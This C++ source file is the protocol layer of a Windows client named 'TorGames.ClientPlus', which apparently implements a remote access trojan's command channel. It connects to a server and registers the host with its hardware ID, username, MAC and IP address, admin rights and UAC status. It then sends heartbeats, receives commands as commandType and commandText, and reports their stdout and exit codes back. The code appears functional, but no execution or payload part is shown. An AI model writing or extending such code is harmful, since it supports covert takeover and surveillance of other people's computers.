// TorGames.ClientPlus - Protocol implementation
#include "protocol.h"
#include "utils.h"
#include "logger.h"
#include "fingerprint.h"
#include <memory>

Protocol::Protocol() : m_socket(INVALID_SOCKET), m_connected(false) {
    InitializeCriticalSection(&m_sendLock);

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
}

Protocol::~Protocol() {
    Disconnect();
    DeleteCriticalSection(&m_sendLock);
    WSACleanup();
}

bool Protocol::Connect(const char* host, int port) {
    if (m_connected) Disconnect();

    m_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (m_socket == INVALID_SOCKET) {
        LOG_ERROR("Failed to create socket: %d", WSAGetLastError());
        return false;
    }

    // Set socket options
    int timeout = 10000;
    setsockopt(m_socket, SOL_SOCKET, SO_RCVTIMEO, reinterpret_cast<const char*>(&timeout), sizeof(timeout));
    setsockopt(m_socket, SOL_SOCKET, SO_SNDTIMEO, reinterpret_cast<const char*>(&timeout), sizeof(timeout));

    // Disable Nagle's algorithm
    int nodelay = 1;
    setsockopt(m_socket, IPPROTO_TCP, TCP_NODELAY, reinterpret_cast<const char*>(&nodelay), sizeof(nodelay));

    struct sockaddr_in serverAddr = {};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(static_cast<u_short>(port));
    inet_pton(AF_INET, host, &serverAddr.sin_addr);

    LOG_INFO("Connecting to %s:%d...", host, port);

    if (connect(m_socket, reinterpret_cast<struct sockaddr*>(&serverAddr), sizeof(serverAddr)) == SOCKET_ERROR) {
        LOG_ERROR("Connect failed: %d", WSAGetLastError());
        closesocket(m_socket);
        m_socket = INVALID_SOCKET;
        return false;
    }

    m_connected = true;
    LOG_INFO("Connected successfully");
    return true;
}

void Protocol::Disconnect() {
    if (m_socket != INVALID_SOCKET) {
        shutdown(m_socket, SD_BOTH);
        closesocket(m_socket);
        m_socket = INVALID_SOCKET;
    }
    m_connected = false;
}

bool Protocol::IsConnected() const {
    return m_connected;
}

bool Protocol::SendRaw(const void* data, int len) {
    const char* ptr = static_cast<const char*>(data);
    int remaining = len;

    while (remaining > 0) {
        int sent = send(m_socket, ptr, remaining, 0);
        if (sent <= 0) {
            LOG_ERROR("Send failed: %d", WSAGetLastError());
            m_connected = false;
            return false;
        }
        ptr += sent;
        remaining -= sent;
    }
    return true;
}

bool Protocol::RecvRaw(void* data, int len, int timeoutMs) {
    char* ptr = static_cast<char*>(data);
    int remaining = len;

    fd_set readSet;
    struct timeval tv;
    tv.tv_sec = timeoutMs / 1000;
    tv.tv_usec = (timeoutMs % 1000) * 1000;

    while (remaining > 0) {
        FD_ZERO(&readSet);
        FD_SET(m_socket, &readSet);

        int selectResult = select(static_cast<int>(m_socket) + 1, &readSet, nullptr, nullptr, &tv);
        if (selectResult <= 0) {
            if (selectResult == 0) {
                return false; // Timeout
            }
            LOG_ERROR("Select failed: %d", WSAGetLastError());
            m_connected = false;
            return false;
        }

        int received = recv(m_socket, ptr, remaining, 0);
        if (received <= 0) {
            if (received == 0) {
                LOG_INFO("Connection closed by server");
            } else {
                LOG_ERROR("Recv failed: %d", WSAGetLastError());
            }
            m_connected = false;
            return false;
        }
        ptr += received;
        remaining -= received;
    }
    return true;
}

bool Protocol::SendJson(const char* json) {
    EnterCriticalSection(&m_sendLock);

    int jsonLen = static_cast<int>(strlen(json));

    // Send 4-byte length header (big-endian)
    unsigned char header[4];
    header[0] = static_cast<unsigned char>((jsonLen >> 24) & 0xFF);
    header[1] = static_cast<unsigned char>((jsonLen >> 16) & 0xFF);
    header[2] = static_cast<unsigned char>((jsonLen >> 8) & 0xFF);
    header[3] = static_cast<unsigned char>(jsonLen & 0xFF);

    bool result = SendRaw(header, 4) && SendRaw(json, jsonLen);

    LeaveCriticalSection(&m_sendLock);

    if (result) {
        LOG_DEBUG("Sent: %s", json);
    }
    return result;
}

std::string Protocol::ReadJson(int timeoutMs) {
    // Read 4-byte length header
    unsigned char header[4];
    if (!RecvRaw(header, 4, timeoutMs)) {
        return "";
    }

    int jsonLen = (header[0] << 24) | (header[1] << 16) | (header[2] << 8) | header[3];

    if (jsonLen <= 0 || jsonLen > BUFFER_SIZE) {
        LOG_ERROR("Invalid message length: %d", jsonLen);
        m_connected = false;
        return "";
    }

    // Read JSON payload
    std::unique_ptr<char[]> json(new char[jsonLen + 1]);
    if (!RecvRaw(json.get(), jsonLen, timeoutMs)) {
        return "";
    }
    json[jsonLen] = '\0';

    LOG_DEBUG("Received: %s", json.get());
    return std::string(json.get());
}

bool Protocol::SendRegister(const char* clientType, const char* hardwareId,
    const char* machineName, const char* osVersion, const char* osArch,
    int cpuCount, long long totalMemory, const char* username,
    const char* clientVersion, const char* ipAddress, const char* macAddress,
    bool isAdmin, bool isUacEnabled) {

    char json[BUFFER_SIZE];
    snprintf(json, sizeof(json),
        "{"
        "\"type\":\"registration\","
        "\"clientId\":\"%s\","
        "\"clientType\":\"%s\","
        "\"machineName\":\"%s\","
        "\"osVersion\":\"%s\","
        "\"osArch\":\"%s\","
        "\"cpuCount\":%d,"
        "\"totalMemory\":%lld,"
        "\"username\":\"%s\","
        "\"clientVersion\":\"%s\","
        "\"ipAddress\":\"%s\","
        "\"macAddress\":\"%s\","
        "\"isAdmin\":%s,"
        "\"isUacEnabled\":%s"
        "}",
        Utils::JsonEscape(hardwareId).c_str(),
        clientType,
        Utils::JsonEscape(machineName).c_str(),
        Utils::JsonEscape(osVersion).c_str(),
        osArch,
        cpuCount,
        totalMemory,
        Utils::JsonEscape(username).c_str(),
        clientVersion,
        ipAddress,
        macAddress,
        isAdmin ? "true" : "false",
        isUacEnabled ? "true" : "false");

    return SendJson(json);
}

bool Protocol::SendRegister(const char* clientType, const char* hardwareId, const char* systemInfoJson) {
    // Parse system info JSON to extract individual fields
    std::string machineName = Utils::JsonGetString(systemInfoJson, "machineName");
    std::string username = Utils::JsonGetString(systemInfoJson, "username");
    std::string osVersion = Utils::JsonGetString(systemInfoJson, "osVersion");
    std::string architecture = Utils::JsonGetString(systemInfoJson, "architecture");
    int cpuCount = static_cast<int>(Utils::JsonGetInt(systemInfoJson, "cpuCount"));
    long long totalMemory = Utils::JsonGetInt(systemInfoJson, "totalMemory");
    std::string localIp = Utils::JsonGetString(systemInfoJson, "localIp");
    bool isAdmin = Utils::JsonGetBool(systemInfoJson, "isAdmin");
    bool isUacEnabled = Utils::JsonGetBool(systemInfoJson, "uacEnabled");

    // Get MAC address from fingerprint
    std::string macAddress = Fingerprint::GetMacAddress();

    return SendRegister(clientType, hardwareId,
        machineName.c_str(), osVersion.c_str(), architecture.c_str(),
        cpuCount, totalMemory, username.c_str(),
        CLIENT_VERSION, localIp.c_str(), macAddress.c_str(),
        isAdmin, isUacEnabled);
}

bool Protocol::SendHeartbeat(long long uptimeSeconds, long long availMemory) {
    char json[256];
    snprintf(json, sizeof(json),
        "{\"type\":\"heartbeat\",\"uptime\":%lld,\"availMemory\":%lld}",
        uptimeSeconds, availMemory);

    return SendJson(json);
}

bool Protocol::SendHeartbeat() {
    // Get current uptime and available memory
    DWORD uptime = GetTickCount() / 1000;  // Seconds since system start
    MEMORYSTATUSEX memStatus = { sizeof(memStatus) };
    GlobalMemoryStatusEx(&memStatus);

    return SendHeartbeat(static_cast<long long>(uptime), static_cast<long long>(memStatus.ullAvailPhys));
}

bool Protocol::SendCommandResult(const char* commandId, bool success, int exitCode,
    const char* output, const char* error) {

    char json[BUFFER_SIZE];
    snprintf(json, sizeof(json),
        "{"
        "\"type\":\"result\","
        "\"commandId\":\"%s\","
        "\"success\":%s,"
        "\"exitCode\":%d,"
        "\"stdout\":\"%s\","
        "\"error\":\"%s\""
        "}",
        commandId,
        success ? "true" : "false",
        exitCode,
        Utils::JsonEscape(output).c_str(),
        Utils::JsonEscape(error).c_str());

    return SendJson(json);
}

bool Protocol::SendCommandResponse(const char* commandId, bool success, const char* result) {
    return SendCommandResult(commandId, success, success ? 0 : 1, result, success ? "" : result);
}

bool Protocol::ReceiveMessage(ServerMessage& msg, int timeoutMs) {
    std::string json = ReadJson(timeoutMs);
    if (json.empty()) {
        return false;
    }

    // Parse message fields
    msg.type = Utils::JsonGetString(json.c_str(), "type");
    msg.commandId = Utils::JsonGetString(json.c_str(), "commandId");
    msg.commandType = Utils::JsonGetString(json.c_str(), "commandType");
    msg.commandText = Utils::JsonGetString(json.c_str(), "commandText");
    msg.error = Utils::JsonGetString(json.c_str(), "error");
    msg.timeout = static_cast<int>(Utils::JsonGetInt(json.c_str(), "timeout"));

    return true;
}
